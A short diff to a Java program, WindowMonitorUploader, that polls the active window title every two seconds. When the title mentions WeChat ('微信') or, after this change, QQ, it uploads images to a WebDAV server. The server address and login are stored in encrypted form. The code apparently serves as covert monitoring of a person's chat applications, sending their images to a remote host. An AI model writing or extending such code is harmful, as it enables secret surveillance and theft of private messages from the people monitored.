@@ -52,7 +52,8 @@ public class WindowMonitorUploader {
     private static String WEBDAV_URL = "cN2tIFNhoFyjJ44hmiYoyWKtJEbDF0HMquNp0XX98DM=";
     private static final String USERNAME = "DVlKm5MyVy9+MVLS7wTVHhx6gVPPLfi6YqM0P3oP9KQ=";
     private static final String PASSWORD = "jg8PewVdbl3x1KDrc24iwBhvVutacFQFq6MQaxt807PTn0gaMhrLNPqUt1kLi+Bb";
-    private static final String MATCH_KEYWORD = "微信";
+    private static final String MATCH_KEYWORD_1 = "微信";
+    private static final String MATCH_KEYWORD_2 = "QQ";
     private static final long interval = 2000;
 
     public static void main(String[] args) throws Exception {
@@ -62,7 +63,7 @@ public class WindowMonitorUploader {
         while (true) {
             try {
                 String title = getActiveWindowTitle();
-                if (title.contains(MATCH_KEYWORD)) {
+                if (title.contains(MATCH_KEYWORD_1) || title.contains(MATCH_KEYWORD_2)) {
                     uploadWechatImage(sardine);
                 }
                 Thread.sleep(interval);
